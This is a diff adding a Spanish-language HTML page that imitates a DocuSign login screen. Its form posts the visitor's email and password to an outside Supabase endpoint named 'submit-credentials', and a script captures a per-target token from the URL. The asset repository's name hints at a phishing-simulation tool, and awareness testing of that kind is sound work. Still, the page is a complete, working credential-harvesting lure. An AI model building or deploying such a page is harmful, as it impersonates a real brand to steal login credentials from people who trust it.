@@ -1,0 +1,32 @@
+<!doctype html>
+<html lang="es"><head><meta charset="utf-8">
+<title>DocuSign - Iniciar sesión</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>
+  *{box-sizing:border-box}
+  body{margin:0;background:#f5f5f5;font-family:'Open Sans',Arial,sans-serif;color:#333;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+  .box{background:#fff;width:100%;max-width:440px;padding:40px;border-radius:6px;box-shadow:0 2px 10px rgba(0,0,0,0.08)}
+  .logo{height:32px;margin-bottom:28px}
+  h1{font-weight:600;font-size:24px;margin:0 0 24px;color:#000}
+  input{width:100%;padding:12px 14px;font-size:15px;border:1px solid #cdcdcd;border-radius:4px;outline:none;font-family:inherit;margin-bottom:18px}
+  input:focus{border-color:#FFCC22}
+  button{display:block;width:100%;background:#FFCC22;color:#000;border:none;padding:13px;font-size:14px;font-weight:700;border-radius:4px;cursor:pointer;font-family:inherit;letter-spacing:0.5px;margin-top:8px;text-transform:uppercase}
+  button:hover{background:#f0bf00}
+  .hint{font-size:13px;color:#666;margin-top:18px;text-align:center}
+  a{color:#0d3a5d;text-decoration:none}
+  a:hover{text-decoration:underline}
+</style></head>
+<body>
+<div class="box">
+  <img class="logo" src="https://cdn.jsdelivr.net/gh/mikel-santisteban/deceptics-email-assets@main/docusign.png" alt="DocuSign">
+  <h1>Acceder para revisar el documento</h1>
+  <form action="https://amjshbgyuazrtxrokqwy.supabase.co/functions/v1/submit-credentials" method="POST">
+    <input type="hidden" name="token" id="token-field">
+    <input type="email" name="email" placeholder="Email" required autofocus>
+    <input type="password" name="password" placeholder="Contraseña" required>
+    <button type="submit">Continuar</button>
+  </form>
+  <p class="hint"><a href="#">¿Olvidaste tu contraseña?</a></p>
+</div>
+<script>document.getElementById('token-field').value=new URLSearchParams(location.search).get('t')||'';</script>
+</body></html>
